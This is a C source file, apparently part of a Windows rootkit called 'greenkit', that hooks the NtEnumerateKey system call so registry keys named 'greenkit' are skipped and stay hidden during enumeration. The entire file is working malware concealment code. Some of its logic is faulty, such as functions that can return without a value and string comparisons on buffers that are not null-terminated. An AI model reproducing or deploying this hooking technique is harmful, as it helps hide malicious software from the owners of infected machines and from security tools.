#include "stdafx.h"

#include "NtEnumerateKey.h"
#include <windows.h>
#include "hooking.h"

BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
	if (wcscmp(uStr_reg.Buffer, L"greenkit") <= 0)
		return TRUE;
}

BOOL mustHideReg(UNICODE_STRING uStr_reg) {
	if (wcscmp(uStr_reg.Buffer, L"greenkit") == 0)
		return TRUE;
}

PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return (PVOID) &(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
	else if (KeyInformationClass == KeyNodeInformation)
		return (PVOID) &(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
}

ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
	else if (KeyInformationClass == KeyNodeInformation)
		return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
}

NTSTATUS NTAPI NewNtEnumerateKey(
	HANDLE					KeyHandle,
	ULONG					Index,
	KEY_INFORMATION_CLASS	KeyInformationClass,
	PVOID					KeyInformation,
	ULONG					Length,
	PULONG					ResultLength)
{
	NTSTATUS ret;
	UNICODE_STRING uStr_tmp;
	ULONG tmpIndex;

	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

	if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
		return ret;
	else if (!NT_SUCCESS(ret))
		return ret;

	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	if (!mustShiftReg(uStr_tmp)) // TODO change this part for more than one key to hide
		return ret;

	tmpIndex = Index + 1;
	ret = ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
	if (ret != STATUS_SUCCESS)
		return ret;
	
	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	tmpIndex = Index;
	if (mustHideReg(uStr_tmp))
		++tmpIndex;

	return ((TD_NtEnumerateKey)hooking_getOldFunction("NtEnumerateKey")) (KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
}